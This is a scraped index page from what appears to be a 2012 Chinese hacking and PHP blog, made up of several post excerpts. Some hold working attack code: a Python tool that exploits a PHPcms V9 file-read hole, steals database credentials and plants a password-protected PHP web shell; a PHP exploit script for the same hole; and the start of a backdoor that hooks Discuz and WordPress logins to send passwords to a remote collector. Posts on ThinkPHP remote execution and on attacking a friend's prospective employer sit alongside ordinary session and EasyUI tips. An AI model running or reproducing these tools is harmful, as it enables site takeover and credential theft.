            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash
            self.urlPostData()
            urllib2.urlopen('http://'+self.rhost+'/index.php?m=search').read()#访问模版页面生成shell
            #写回原模版
            self.postData = {
                    'code':templateTmp,
                    'dosubmit':'提交',
                    'pc_hash':self.pc_hash
                }
            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash
            self.urlPostData()
        else:
            print '没有找到Search的foot模版...'
    #==============================================================
    # getVerifyCode    获取验证码
    #==============================================================
    def getVerifyCode(self):
        #验证码获取地址
        self.tmpPath = '/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background='
        self.url = 'http://'+self.rhost+self.tmpPath
        open(self.codeSavePath,'wb').write(self.urlPostData())
        print '请输入验证码:'
        self.showPic()
        self.vfCode = sys.stdin.readline()

    #==============================================================
    # urlPostData    url Post提交数据
    #==============================================================
    def urlPostData(self):
        postData = urllib.urlencode(self.postData)
        req = urllib2.Request(
                          url = self.url,
                          data = postData,
                          headers = self.header
                          )
        result = urllib2.urlopen(req).read()
        self.saveCookie()
        self.delVariable()
        return result

    #==============================================================
    # getDataBaseInfo    获取数据库信息
    #==============================================================
    def getDataBaseInfo(self):
        #爆数据库信息地址
        self.tmpPath = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'
        self.url = 'http://'+self.rhost+self.tmpPath
        result = self.urlPostData()
        self.dataBaseInfo['hostName'] = re.search(&quot;(?&lt;='hostname' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['database'] = re.search(&quot;(?&lt;='database' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['username'] = re.search(&quot;(?&lt;='username' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['password'] = re.search(&quot;(?&lt;='password' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['tablepre'] = re.search(&quot;(?&lt;='tablepre' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['type'] = re.search(&quot;(?&lt;='type' =&gt; ')(.*?)(?=',)&quot;,result).group()
    #==============================================================
    # printDbInfo    输出数据库信息
    #==============================================================
    def printDbInfo(self):
        print 'HostName:',self.dataBaseInfo['hostName']
        print 'DataBase:',self.dataBaseInfo['database']
        print 'UserName:',self.dataBaseInfo['username']
        print 'Password:',self.dataBaseInfo['password']
        print 'TablePre:',self.dataBaseInfo['tablepre']
        print 'DataType:',self.dataBaseInfo['type']
    #==============================================================
    # scanPort    端口扫描
    #==============================================================
    def scanPort(self):
        for p in range(80,8000):
            try:
                ip = 'www.gidigame.com'
                port = p
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((ip,port))
                print 'Port:',port,' open'
                s.close()
            except socket.error,msg:
                pass
                #print 'Port:',port,' close'
    #==============================================================
    # setRhost    设置目标主机
    #==============================================================
    def setRhost(self,host):
        self.rhost = host
    #==============================================================
    # getRhost    获取目标主机
    #==============================================================
    def getRhost(self):
        return self.rhost
    #==============================================================
    # setShell    自定义shell
    #==============================================================
    def setShell(self,shellCode):
        self.phpShell = shellCode
    #==============================================================
    # saveCookie    保存cookie值
    #==============================================================
    def saveCookie(self):
        self.cookie.save(self.cookieSavePath)
    #==============================================================
    # logMsg    日志信息，这里可以自己捕捉异常后处理信息
    #==============================================================
    def logMsg(self,msg):
        print msg
        exit()
    #==============================================================
    # showPic    用来显示验证码
    #==============================================================
    def showPic(self):
        imgPath = os.path.abspath(self.codeSavePath)
        os.system('rundll32.exe %SystemRoot%system32shimgvw.dll,ImageView_Fullscreen '+imgPath)
    #==============================================================
    # delVariable    清除变量，防止产生误差
    #==============================================================
    def delVariable(self):
        self.url            = ''
        self.tmpPath        = ''
        self.dataBaseInfo   = {}
        self.postData       = {}
        self.header         ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
    #==============================================================
    # __del__    析构函数，类被注销时候调用
    #==============================================================
    def __del__(self):
        print 'Bye...'
def sysinfo():
    print '''
********************************************************************************
PHPcmsV9 自动写shell

功能：自动写入caches目录下cmd.php一句话 密码:cmd

Author: Return    Blog:www.creturn.com

Example: exp.py www.creutn.com username password
********************************************************************************
'''
#================================================================
# main    入口函数
#================================================================
def main():
    sysinfo();
    shell = getShell()
    if(len(sys.argv) &gt; 3):
        shell.setRhost(sys.argv[1])
        shell.username = sys.argv[2]
        shell.password = sys.argv[3]
	shell.login()
    else:
        print '参数不对！'

if __name__ == '__main__':
    main()
</pre></td></tr></table></figure>


      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-08-python版-phpcmsv9自动写shell工具.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-08-03-php-session-跨子域问题总结.html">PHP session 跨子域问题总结</a></h1>
  

      <time datetime="2012-08-02T17:26:03.000Z"><a href="/html/2012-08-03-php-session-跨子域问题总结.html">8月 3 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>今天遇到这个问题是，自己要在别人现有的东西上面做修改。由于仅仅是子域</p>
<p>当时就行肯定有简单的解决方法，Google了10多分钟搞定：</p>
<p>Session主要分两部分：</p>
<p>一个是Session数据，该数据默认情况下是存放在服务器的tmp文件下的，是以文件形式存在
另一个是标志着Session数据的Session Id，Session ID，就是那个 Session 文件的文件名，Session ID 是随机生成的，因此能保证唯一性和随机性，确保 Session 的安全。一般如果没有设置 Session 的生存周期，则 Session ID 存储在内存中，关闭浏览器后该 ID 自动注销，重新请求该页面后，重新注册一个 session ID。如果客户端没有禁用 Cookie，则 Cookie 在启动 Session 会话的时候扮演的是存储 Session ID 和 Session 生存期的角色。
两个不同的域名网站，想用同一个Session，就是牵扯到Session跨域问题！
默认情况下，各个服务器会各自分别对同一个客户端产生 SESSIONID，如对于同一个用户浏览器，A 服务器产生的 SESSION ID 是 11111111111，而B 服务器生成的则是222222。另外，PHP 的 SESSION数据都是分别保存在本服务器的文件系统中。想要共享 SESSION 数据，那就必须实现两个目标：
一个是各个服务器对同一个客户端产生的SESSION ID 必须相同，并且可通过同一个 COOKIE 进行传递，也就是说各个服务器必须可以读取同一个名为 PHPSESSID 的COOKIE；另一个是 SESSION 数据的存储方式/位置必须保证各个服务器都能够访问到。这两个目标简单地说就是多服务器(A、B服务器)共享客户端的 SESSION ID，同时还必须共享服务器端的 SESSION 数据。</p>
<p>有三种解决方法：</p>
<p>1.只要在php页面的最开始（要在任何输出之前，并且在session_start()之前）的地方进行以下设置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>ini_set(<span class="string">'session.cookie_path'</span>, <span class="string">'/'</span>);
ini_set(<span class="string">'session.cookie_domain'</span>, <span class="string">'.mydomain.com'</span>);
ini_set(<span class="string">'session.cookie_lifetime'</span>, <span class="string">'1800'</span>);
</pre></td></tr></table></figure>

<p>2.在php.ini里设置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>session.cookie_path = /
session.cookie_domain = .mydomain.com
session.cookie_lifetime = <span class="number">1800</span>
</pre></td></tr></table></figure>

<p>3.在php页面最开始的地方（条件同1）调用函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>session_set_cookie_params(<span class="number">1800</span> , <span class="string">'/'</span>, <span class="string">'.mydomain.com'</span>);
</pre></td></tr></table></figure>


      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-08-03-php-session-跨子域问题总结.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-29-phpcmsv9任意文件读取漏洞拿shell.html">PHPcmsV9任意文件读取漏洞拿Shell</a></h1>
  

      <time datetime="2012-07-28T18:33:37.000Z"><a href="/html/2012-07-29-phpcmsv9任意文件读取漏洞拿shell.html">7月 29 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>前几天爆的phpcmsV9任意文件读取漏洞，其实危害是很大的，但往往还是一些管理员</p>
<p>觉得漏洞并不可怕，听到某人说道，即使是被人读取了数据库数据也没用，为啥，因为</p>
<p>他权限数据库权限单库单用户，并且v9制作前台cms发布里面就只有管理员账户并且不发</p>
<p>分子拿到密码也没用因为破解不了他的密码，其实我想说你丫的把黑阔当傻子？你能想到</p>
<p>的别人想不到，废话就不说了，看着就是了~~</p>
<p>本地搭建的phpcsmV9.现用漏洞或者工具读取数据库信息：</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg" alt="" title="v9shell_1"></a></p>
<p>
      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-29-phpcmsv9任意文件读取漏洞拿shell.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-29-eclipse设置courier-new字体.html">Eclipse设置Courier New字体</a></h1>
  

      <time datetime="2012-07-28T17:42:40.000Z"><a href="/html/2012-07-29-eclipse设置courier-new字体.html">7月 29 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>今天把之前的eclipse 3.X升级了下换成了4.2的版本，于是乎又要配置一番</p>
<p>结果发现window7下依然不能设置字体为Courier New字体。我想做开发的</p>
<p>同学对这个字体应该很熟悉把，写代码看着舒服，之前的3.2版本解决方法是</p>
<p>改eclipse里面的一个jar包。具体那个还给忘记了。所以想想linux默认是可以</p>
<p>设置CourierNew字体为啥window7下却不行？于是度娘10分钟后找到答案</p>
<p>打开控制面板-》找到字体打开</p>
<p>然后在字体文件夹里面找到CourierNew字体右击选择显示如图：</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/07/font.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/font.jpg" alt="" title="font"></a></p>

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-29-eclipse设置courier-new字体.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-25-phpcmsv9最新任意读文件漏洞利用工具.html">phpcmsV9最新任意读文件漏洞利用工具</a></h1>
  

      <time datetime="2012-07-24T18:36:28.000Z"><a href="/html/2012-07-25-phpcmsv9最新任意读文件漏洞利用工具.html">7月 25 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p><span style="color: #ff0000;">注意：本程序带有攻击性，仅供学习研究请勿当作非法工具使用，否则后果自负，</span><span style="color: #ff0000;">于本人无关！</span></p>
<p>睡觉前去论坛上面看了下，爆出 phpcmsV9最新任意读文件漏洞 ，第一反映就是</p>
<p>完了，估计互联网上又不知道多少万用户数据被脱了~~</p>
<p>自己就写了一个此漏洞的检测工具方便站长们检测自己的站点是否存在漏洞。</p>
<p>代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="code"><pre><span class="preprocessor">&lt;?php</span>
<span class="comment">/**
 * PHPcms V9 任意文件读取漏洞检测工具
 *<span class="phpdoc"> @author</span> Return Blog: www.creturn.com
 * Email: master@creturn.com
 *
 * 注意本程序仅供学习参考，不得用于非法互动
 * 否则后果自负，与本人无关！
 */</span>

<span class="function"><span class="keyword">function</span> <span class="title">showInfo</span><span class="params">()</span> {</span>

<span class="keyword">print</span> <span class="string">'
***********************************************
* PHPcmsV9 Read All File ExpTool By: Return
*
* Blog: www.creturn.com
*
* Email:master@creturn.com
*
* Example: php exp.php wwww.phpcms.cn
***********************************************
'</span>;
}

<span class="variable">$exp</span> = <span class="string">'/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'</span>;

<span class="comment">//file_get_contents(''.$exp);</span>
<span class="keyword">if</span>(count(<span class="variable">$argv</span>) &lt; <span class="number">2</span>){
 showInfo();
}<span class="keyword">else</span>{

 <span class="variable">$exp</span> = <span class="string">'http://'</span>.<span class="variable">$argv</span>[<span class="number">1</span>].<span class="variable">$exp</span>;
 <span class="variable">$data</span> = @file_get_contents(<span class="variable">$exp</span>);
 @file_put_contents(<span class="string">'expDatabase.php'</span>, <span class="variable">$data</span>);
 <span class="keyword">if</span>(strstr(<span class="variable">$data</span>,<span class="string">'&lt;html&gt;'</span>)){
 showInfo();
 <span class="keyword">echo</span> <span class="string">'Not found !'</span>;
 <span class="keyword">exit</span>();
 };
 <span class="variable">$database</span> = <span class="keyword">include</span> <span class="string">'expDatabase.php'</span>;
 showInfo();
 <span class="variable">$out</span> = <span class="string">'HostName: '</span>.<span class="variable">$database</span>[<span class="string">'default'</span>][<span class="string">'hostname'</span>].<span class="string">"n"</span>;
 <span class="variable">$out</span> .=<span class="string">'DataBase:'</span>. <span class="variable">$database</span>[<span class="string">'default'</span>][<span class="string">'database'</span>].<span class="string">"n"</span>;
 <span class="variable">$out</span> .=<span class="string">'UserName:'</span>. <span class="variable">$database</span>[<span class="string">'default'</span>][<span class="string">'username'</span>].<span class="string">"n"</span>;
 <span class="variable">$out</span> .=<span class="string">'Password:'</span>. <span class="variable">$database</span>[<span class="string">'default'</span>][<span class="string">'password'</span>].<span class="string">"n"</span>;
 <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$database</span>)){
 <span class="keyword">echo</span> <span class="string">"Found it! :nn"</span>;
 <span class="keyword">echo</span> <span class="variable">$out</span>;
 }
 @unlink(<span class="string">'expDatabase.php'</span>);
}
</pre></td></tr></table></figure>


      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-25-phpcmsv9最新任意读文件漏洞利用工具.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-19-dedecms-v5-7-注入漏洞利用.html">dedecms v5.7 注入漏洞利用</a></h1>
  

      <time datetime="2012-07-19T15:45:46.000Z"><a href="/html/2012-07-19-dedecms-v5-7-注入漏洞利用.html">7月 19 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>dedecms 的这个漏洞已经是老漏洞了，只不过今天同学给我说他明天去面试</p>
<p>所以就顺手给他去面试的那家公司做个安全测试，就把过程记录下来吧：</p>
<p>首先打开目标站点：</p>
<p>右击查看网站源代码，发现几个比较特殊的地方：</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/07/dede_source.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/dede_source.png" alt="" title="dede_source"></a></p>
<p>可以看到根目录有a文件夹和uploads，对于dedecms熟悉的人都知道，dedecms有a和uploads/allimg目录，</p>
<p>抱着试试的心态目标站点后面加上member看看，一般做二次开发不带会员中心的话member基本还是原因，</p>
<p>也就能判断出目标系统：</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/dede_cms.png" alt="" title="dede_cms"></a></p>
<p>可以清楚的看到目标是dedecms系统

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-19-dedecms-v5-7-注入漏洞利用.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-19-91手机助手某站点漏洞及利用.html">91手机助手某站点漏洞及利用</a></h1>
  

      <time datetime="2012-07-19T12:39:59.000Z"><a href="/html/2012-07-19-91手机助手某站点漏洞及利用.html">7月 19 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>其实这个漏洞也是偶然发现的，最近项目中用到了ThinkPHP框架习惯性的想到</p>
<p>了此框架的漏洞，那就顺便google了一下看看现在还有那些大点的站存在此漏洞</p>
<p>结果91.com这个字眼吸引了我。google:intitle:系统错误 thinkphp 91</p>
<p><a href="http://asset.creturn.com/asset/uploads/2012/07/91_2.png" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/91_2.png" alt="" title="91_2"></a></p>
<p>那就顺手测试一下啊结果存在远程命令执行漏洞

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-19-91手机助手某站点漏洞及利用.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-18-copy命令制作图马和隐藏文件.html">Copy命令制作图马和隐藏文件</a></h1>
  

      <time datetime="2012-07-18T05:17:05.000Z"><a href="/html/2012-07-18-copy命令制作图马和隐藏文件.html">7月 18 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>好几天没写BLog了，就写一个利用copy命令制作图马和隐藏文件到图片里面的教程吧</p>
<p>首先看下copy 命令的参数（百科直接copy来的）：</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre>COPY [/D] [/V] [/N] [/Y | /-Y] [/Z] [/A | /B ] <span class="keyword">source</span> [/A | /B]
[+ <span class="keyword">source</span> [/A | /B] [+ <span class="keyword">...</span>]] [destination [/A | /B]]
</pre></td></tr></table></figure>

<blockquote>
<p>source 指定要复制的文件。</p>
<p>/A 表示一个 ASCII 文本文件。</p>
<p>/B 表示一个二进位文件。</p>
<p>/D 允许解密要创建的目标文件destination 为新文件指定目录和/或文件名。</p>
<p>/V 验证新文件写入是否正确。</p>
<p>/N 复制带有非 8dot3 名称的文件时，尽可能使用短文件名。</p>
<p>/Y 不使用确认是否要覆盖现有目标文件的提示。</p>
<p>/-Y 使用确认是否要覆盖现有目标文件的提示。</p>
<p>/Z 用可重新启动模式复制已联网的文件

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-18-copy命令制作图马和隐藏文件.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-11-easyui-分页实现方法.html">EasyUi 分页实现方法</a></h1>
  

      <time datetime="2012-07-11T15:59:14.000Z"><a href="/html/2012-07-11-easyui-分页实现方法.html">7月 11 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>最近项目中使用到EasyUI的前端框架,分页我想基本上没有那个项目能够离开的，</p>
<p>结果今天悲剧的把官方文档翻了一边竟然没找到实例和说明。最终一番Google</p>
<p>最终找到方法:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre></td><td class="code"><pre>
<span class="comment">//自定义Grid分页数据表</span>
<span class="function"><span class="keyword">function</span> <span class="title">CreateGridPage</span><span class="params">(url,feildData)</span>{</span>
 <span class="keyword">var</span> title = arguments[<span class="number">2</span>] ? arguments[<span class="number">2</span>] : <span class="string">'数据表格'</span>;
 <span class="keyword">var</span> tab = arguments[<span class="number">3</span>] ? arguments[<span class="number">3</span>] : <span class="string">'#tab'</span>;
 <span class="keyword">var</span> id = &quot;gidi_&quot;+Math.floor(Math.random()*<span class="number">1000</span>+<span class="number">1</span>);
 $(tab).tabs(<span class="string">'add'</span>,{
 id:id,
 title:title,
 closable:<span class="keyword">true</span>,
 });
 CreateGrid(id,url,feildData,title,<span class="keyword">true</span>);
}
<span class="comment">//创建window窗口数据表格</span>
<span class="function"><span class="keyword">function</span> <span class="title">CreateGridWind</span><span class="params">(url,feildData,width,heigth)</span>{</span>
 <span class="keyword">var</span> id = &quot;gidi_win_&quot;+Math.floor(Math.random()*<span class="number">1000</span>+<span class="number">1</span>);
 <span class="keyword">var</span> title = arguments[<span class="number">4</span>] ? arguments[<span class="number">4</span>] : <span class="string">'数据表格'</span>;
 $(<span class="string">'body'</span>).append(<span class="string">'&lt;div id=&quot;'</span>+id+<span class="string">'&quot;&gt;&lt;/div&gt;'</span>);
 $(<span class="string">'#'</span>+id).window({
 title:title,
 width:width,
 height:heigth,
 modal:<span class="keyword">true</span>
 });
 CreateGrid(id,url,feildData,<span class="keyword">null</span>);
}
<span class="comment">//创建带分页的数据表格</span>
<span class="function"><span class="keyword">function</span> <span class="title">CreateGrid</span><span class="params">(id,url,feildData,title,pagination)</span>{</span>
 $(<span class="string">'#'</span>+id).datagrid({
 title:title,
 iconCls:<span class="string">'icon-save'</span>,
 url:url,
 idField:feildData.idField,
 singleSelect:<span class="keyword">true</span>,
 striped:<span class="keyword">true</span>,
 rownumbers:<span class="keyword">true</span>,
 pagination:pagination,
 fitColumns:<span class="keyword">true</span>,
 loadMsg:<span class="string">'亲~ 正在努力拉取数据中...'</span>,
 columns:[
 feildData.field
 ]
 });
 <span class="keyword">var</span> page = $(<span class="string">'#'</span>+id).datagrid(<span class="string">'getPager'</span>);
 $(page).pagination({
 showRefresh:<span class="keyword">false</span>,
 beforePageText:<span class="string">'第'</span>,
 afterPageText:<span class="string">'页 共{pages}页'</span>,
 displayMsg:<span class="string">'每页 {to} 条 总共 {total} 记录'</span>,
 onSelectPage:<span class="function"><span class="keyword">function</span><span class="params">(num,size)</span>{</span>
 $(<span class="string">'#'</span>+id).datagrid({
 queryParams:{
 page:num,
 size:size
 }
 });
 }
 });
}
</pre></td></tr></table></figure>

<p>上面代码是自己写好的两个，一个是创建在tab组件中显示Grid表格，另外一个是创建弹出window窗口中显示Grid表格

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-11-easyui-分页实现方法.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-06-ThinkPHP远程执行漏洞利用.html">ThinkPHP远程执行漏洞利用</a></h1>
  

      <time datetime="2012-07-05T16:56:10.000Z"><a href="/html/2012-07-06-ThinkPHP远程执行漏洞利用.html">7月 6 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>睡前一篇文章已经成为习惯，今天就给大家展示一个thinkphp漏洞的利用，其实这个漏洞已经爆出来很久了。只不过很少有人发布这样的文章而已。</p>
<p>先说下ThinkPHP的url规则,这个url规则是thinkPHP默认规则，当然也可以通过路由重写来实现各种你想要的效果。先看看ThinkPHP默认的规则：</p>
<blockquote>
<p><a href="http://www.creturn.com/index.php/news/view/1" target="_blank">http://www.creturn.com/index.php/news/view/1</a></p>
</blockquote>
<p>分析下这个url</p>
<blockquote>
<p><a href="http://www.creturn.com/index.php" target="_blank">http://www.creturn.com/index.php</a>  这个是入口</p>
<p>/news/view/1  其中第一个参数news是指ThinkPHP中的模块，view指的是ThinkPHP中的方法，而后面的参数1则是参数。而漏洞恰巧出在对参数过滤不严格上面了。导致可以提交php方法上去远程执行。</p>
</blockquote>
<p>还是事例来进行演示：</p>
<p>先找一个有thinkPHP漏洞的站点，具体怎么找就不说了。因为ThinkPHP在国内PHP框架中使用的还是比较广泛的，所以存在漏洞的站点，尤其很多大型站点都采用了ThinkPHP框架</p>
<p>据我了解不少游戏官网就是用thinkPHP作为底层开发框架的。好了不废话了看图。</p>
<p>在存在漏洞的页面中输入:www.creturn.com/index.php/fuck

      
    </div>
    <footer>
      
        
          <div class="alignleft">
            <a href="/html/2012-07-06-ThinkPHP远程执行漏洞利用.html#more" class="more-link">Read More</a>
          </div>
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>



  
    
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title"><a href="/html/2012-07-04-登录后门钓鱼程序-v2-0.html">登录后门钓鱼程序 V2.0</a></h1>
  

      <time datetime="2012-07-04T15:59:07.000Z"><a href="/html/2012-07-04-登录后门钓鱼程序-v2-0.html">7月 4 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>此版本中相对1.0版本加入了接收端mysql存储支持。</p>
<p>自动插入后门端加入dz和wordpress的支持</p>
<p>代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
</pre></td><td class="code"><pre><span class="preprocessor">&lt;?php</span>
<span class="comment">/**
 +-----------------------------------------------------------------
 * 登录后门钓鱼程序 V2.0
 +-----------------------------------------------------------------
 * 功能介绍：
 * 本程序会根据所选cms和BBS系统自动插入钓鱼后门
 * 后续将完善支持PHP的主流的cms和bbs系统
 * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息
 +-----------------------------------------------------------------
 * 作者： Return Blogs: www.creturn.com email:master@creturn.com
 +-----------------------------------------------------------------
 **/</span>
error_reporting(<span class="number">0</span>);
<span class="variable">$rHost</span> = <span class="string">'http://192.168.1.199/MyProject/server/sever.php'</span>; <span class="comment">//定义接收地址</span>
<span class="variable">$pUname</span> = <span class="string">'uname'</span>; <span class="comment">//远程端接收用户名参数</span>
<span class="variable">$pPwd</span> = <span class="string">'pwd'</span>; <span class="comment">//定义远程接收密码参数</span>
<span class="variable">$error</span> = <span class="string">''</span>;
<span class="comment">/**
 * 插入代码
 */</span>
<span class="function"><span class="keyword">function</span> <span class="title">inSertPwdDoor</span><span class="params">(<span class="variable">$cmsCode</span>,<span class="variable">$relPath</span>)</span>{</span>
 <span class="keyword">global</span> <span class="variable">$rHost</span>,<span class="variable">$pUname</span>,<span class="variable">$pPwd</span>;
 <span class="comment">//读取用户名密码特制</span>
 <span class="keyword">if</span>(<span class="variable">$cmsCode</span>[<span class="string">'mothed'</span>] == <span class="string">'post'</span>){
 <span class="variable">$rHostPath</span> = <span class="variable">$rHost</span>.<span class="string">'?'</span>.<span class="variable">$pUname</span>.<span class="string">'=$_POST['</span>.<span class="variable">$cmsCode</span>[<span class="string">'uname'</span>].<span class="string">']&amp;'</span>.<span class="variable">$pPwd</span>.<span class="string">'=$_POST['</span>.<span class="variable">$cmsCode</span>[<span class="string">'pwd'</span>].<span class="string">']'</span>;
 }<span class="keyword">else</span>{
 <span class="variable">$rHostPath</span> = <span class="variable">$rHost</span>.<span class="string">'?'</span>.<span class="variable">$pUname</span>.<span class="string">'=$_GET['</span>.<span class="variable">$cmsCode</span>[<span class="string">'uname'</span>].<span class="string">']&amp;'</span>.<span class="variable">$pPwd</span>.<span class="string">'=$_GET['</span>.<span class="variable">$cmsCode</span>[<span class="string">'pwd'</span>].<span class="string">']'</span>;
 }
 <span class="comment">//获取插入代码</span>
 <span class="variable">$keyword</span> = <span class="variable">$cmsCode</span>[<span class="string">'keyword'</span>];
